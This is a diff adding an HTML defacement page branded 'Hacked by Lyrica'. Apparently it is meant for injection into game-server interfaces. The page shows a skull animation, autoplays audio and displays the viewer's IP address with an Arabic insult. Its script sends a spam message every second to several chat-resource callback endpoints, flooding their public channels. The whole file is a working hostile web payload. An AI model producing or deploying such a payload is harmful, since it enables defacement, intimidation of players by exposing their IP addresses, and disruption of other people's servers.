@@ -1,0 +1,142 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Hacked — Lyrica</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;900&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#000;
+      --fade-time:0.5s;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100%}
+    body{
+      background:linear-gradient(180deg,#000 10%,#030303 100%);
+      color:#fff;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      display:flex;align-items:center;justify-content:center;
+      overflow:hidden;
+    }
+    .wrap{width:900px;max-width:96vw;height:520px;position:relative;display:flex;align-items:center;justify-content:center}
+    .stage{position:relative;width:560px;height:420px}
+    .skull-img{
+      width:420px;height:auto;display:block;
+      opacity:1;
+      transition:opacity var(--fade-time) ease-out, transform var(--fade-time) ease-out;
+    }
+    .shards{position:absolute;inset:0;pointer-events:none;opacity:0}
+    .shards.show{animation:shardsEnter 0.6s ease-out forwards 0.6s}
+    @keyframes shardsEnter{0%{opacity:0;transform:scale(0.9)}100%{opacity:1;transform:scale(1)}}
+    .shard{transform-origin:center;fill:transparent;stroke:#fff;stroke-width:2;mix-blend-mode:screen}
+    .shard.glow{filter:drop-shadow(0 0 12px rgba(255,255,255,0.9))}
+    .shard.s1{animation:fly1 1s cubic-bezier(.2,.9,.2,1) forwards 0.65s}
+    .shard.s2{animation:fly2 1s cubic-bezier(.2,.9,.2,1) forwards 0.7s}
+    .shard.s3{animation:fly3 1s cubic-bezier(.2,.9,.2,1) forwards 0.75s}
+    .shard.s4{animation:fly4 1s cubic-bezier(.2,.9,.2,1) forwards 0.8s}
+    .shard.s5{animation:fly5 1s cubic-bezier(.2,.9,.2,1) forwards 0.85s}
+    @keyframes fly1{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translate(-220px,-140px) rotate(-18deg) scale(0.9);opacity:0}}
+    @keyframes fly2{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translate(220px,-160px) rotate(28deg) scale(0.9);opacity:0}}
+    @keyframes fly3{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translate(-120px,160px) rotate(-48deg) scale(0.8);opacity:0}}
+    @keyframes fly4{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translate(120px,160px) rotate(38deg) scale(0.8);opacity:0}}
+    @keyframes fly5{0%{transform:translateY(0) rotate(0) scale(1);opacity:1}100%{transform:translate(0,-220px) rotate(5deg) scale(0.85);opacity:0}}
+
+    /* titles */
+.title{
+  position:absolute; left:50%; text-align:center;
+  font-family:'Cinzel',serif;color:#fff;font-weight:900;font-size:35px;
+  letter-spacing:6px;opacity:0;
+  text-shadow:0 6px 30px rgba(255,255,255,0.08),0 0 32px rgba(255,255,255,0.18);
+  transform:translateX(-50%);
+}
+
+#title{top:50%;}
+#ip-address-value{top:70%;} /* أسفل النص الرئيسي */
+
+.title.reveal{animation:revealTitle 0.9s cubic-bezier(.2,.9,.2,1) forwards;}
+@keyframes revealTitle{
+  0%{opacity:0;transform:translateX(-50%) translateY(10px) scale(0.98);filter:blur(6px);}
+  100%{opacity:1;transform:translateX(-50%) translateY(0) scale(1);filter:blur(0);}
+}
+
+@keyframes whitePulse {
+  0%, 100% { text-shadow:0 6px 30px rgba(255,255,255,0.08),0 0 32px rgba(255,255,255,0.18); color:#fff; }
+  50% { text-shadow:0 6px 30px rgba(255,255,255,0.3),0 0 48px rgba(255,255,255,0.5); color:#fff; }
+}
+
+.title.reveal {
+  animation: revealTitle 0.9s cubic-bezier(.2,.9,.2,1) forwards,
+             whitePulse 1.5s ease-in-out infinite alternate;
+}
+
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <div class="stage" id="stage">
+    <img src="https://i.pinimg.com/originals/25/c3/b7/25c3b7e056ec7bd21dbd69fd93879aa7.gif" alt="Skull" class="skull-img" id="skull">
+    <svg class="shards" viewBox="0 0 600 420" xmlns="http://www.w3.org/2000/svg">
+      <g transform="translate(90,10)">
+        <path class="shard glow s1" d="M170 120 L220 60 L140 70 Z" />
+        <path class="shard glow s2" d="M90 110 L40 50 L120 60 Z" />
+        <path class="shard glow s3" d="M130 170 L70 200 L150 190 Z" />
+        <path class="shard glow s4" d="M200 170 L270 200 L220 190 Z" />
+        <path class="shard glow s5" d="M150 80 L180 40 L200 90 Z" />
+      </g>
+    </svg>
+        <audio autoplay loop>
+            <source src="https://d.top4top.io/m_3540rn7sq1.mp3" />
+            Your browser does not support the audio element.
+        </audio>
+    <div class="title" id="title">H3ACKED BY LYRICA</div>
+    <div class="title" id="ip-address-value"></div>
+  </div>
+</div>
+
+<script>
+  // جلب IP
+  function fetchIPAndInfo() {
+      fetch('https://api.ipify.org/?format=json')
+          .then((response) => response.json())
+          .then((data) => {
+              document.getElementById('ip-address-value').textContent = `ايبيك يا غبي: ${data.ip}`;
+          });
+  }
+  fetchIPAndInfo();
+
+  // تأثير الجمجمة والشظايا والنص
+  window.addEventListener('load', ()=>{
+    const skullImg = document.getElementById('skull');
+    const shards = document.querySelector('.shards');
+    const title = document.getElementById('title');
+    const ipTitle = document.getElementById('ip-address-value');
+
+    setTimeout(()=>{
+      skullImg.style.opacity='0';
+      skullImg.style.transform='scale(0.95) translateY(-5px)';
+      shards.classList.add('show');
+
+      title.classList.add('reveal');
+      ipTitle.classList.add('reveal');
+    }, 1000);
+
+    setTimeout(()=>{
+      document.querySelectorAll('.shard').forEach(s=>{ s.style.opacity='0' });
+    }, 3000);
+  });
+
+  const msg = `👑 LYRICA AL 3M ! 👑`;
+  const body = JSON.stringify({ message: msg });
+  setInterval(() => {
+    fetch("https://flix-scripts/chatResult", { method: "POST", body });
+    fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
+    fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+    fetch("https://melix_chat/chatResult", { method: "POST", body });
+    fetch("https://as_chat/chatResult", { method: "POST", body });
+    fetch("https://chat/chatResult", { method: "POST", body });
+    fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+  }, 1000);
+</script>
+</body>
+</html>
